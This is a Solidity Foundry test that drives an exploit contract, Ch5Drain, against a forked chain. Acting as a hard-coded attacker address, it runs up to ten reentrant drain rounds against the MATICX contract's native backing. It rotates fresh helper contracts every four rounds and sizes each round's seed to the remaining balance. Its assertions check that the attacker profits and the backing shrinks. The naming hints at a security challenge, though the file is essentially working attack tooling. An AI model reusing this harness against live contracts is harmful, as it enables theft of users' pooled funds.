// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {Ch5Drain} from "../exploit/Run.s.sol";

/// @notice Reset-head probe for the generalized native helper rotation.
/// @dev Confirms the exploit can attempt up to ten native rounds while
///      automatically rotating helpers every four rounds, and that the fresh
///      reset head still saturates after five profitable rounds.
contract Attempt60NativeHelperRotationTest is Test {
    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address internal constant MATICX = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;

    uint256 internal constant NATIVE_REENTRY_COUNT = 10;
    uint256 internal constant NATIVE_ROUNDS_PER_HELPER = 4;
    uint256 internal constant NATIVE_MAX_ROUNDS = 10;
    uint256 internal constant NATIVE_GAS_RESERVE = 0.02 ether;
    uint256 internal constant NATIVE_BACKING_MARGIN = 1 gwei;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    function test_reset_head_native_rotation_saturates_after_five_rounds() public {
        uint256 nativeBefore = ATTACKER.balance;
        uint256 backingBefore = MATICX.balance;

        vm.startPrank(ATTACKER);

        uint256 roundsExecuted;
        Ch5Drain nativeDrain;

        while (roundsExecuted < NATIVE_MAX_ROUNDS) {
            if (roundsExecuted % NATIVE_ROUNDS_PER_HELPER == 0) {
                nativeDrain = new Ch5Drain();
                console.log("native helper:", address(nativeDrain));
            }

            uint256 nextSeed = _computeNativeSeed(ATTACKER.balance, MATICX.balance);
            if (nextSeed == 0) {
                break;
            }

            console.log("round:", roundsExecuted + 1);
            console.log("seed:", nextSeed);
            nativeDrain.executeRound{value: nextSeed}(NATIVE_REENTRY_COUNT);

            unchecked {
                ++roundsExecuted;
            }
        }

        vm.stopPrank();

        uint256 nativeAfter = ATTACKER.balance;
        uint256 backingAfter = MATICX.balance;
        uint256 remainingSeed = _computeNativeSeed(nativeAfter, backingAfter);

        console.log("native before:", nativeBefore);
        console.log("native after:", nativeAfter);
        console.log("backing before:", backingBefore);
        console.log("backing after:", backingAfter);
        console.log("rounds executed:", roundsExecuted);
        console.log("next seed after saturation:", remainingSeed);

        assertEq(roundsExecuted, 5, "reset head should saturate after five native rounds");
        assertEq(remainingSeed, 0, "native stage should be exhausted after rotation");
        assertGt(nativeAfter, nativeBefore, "native stage must be profitable");
        assertLt(backingAfter, backingBefore, "native backing should decrease");
    }

    function _computeNativeSeed(uint256 attackerNative, uint256 maticxBackingBefore) internal pure returns (uint256) {
        if (attackerNative <= NATIVE_GAS_RESERVE) {
            return 0;
        }

        uint256 spendable = attackerNative - NATIVE_GAS_RESERVE;
        uint256 safeByBacking = maticxBackingBefore / NATIVE_REENTRY_COUNT;
        if (safeByBacking <= NATIVE_BACKING_MARGIN) {
            return 0;
        }

        unchecked {
            safeByBacking -= NATIVE_BACKING_MARGIN;
        }

        return spendable < safeByBacking ? spendable : safeByBacking;
    }
}
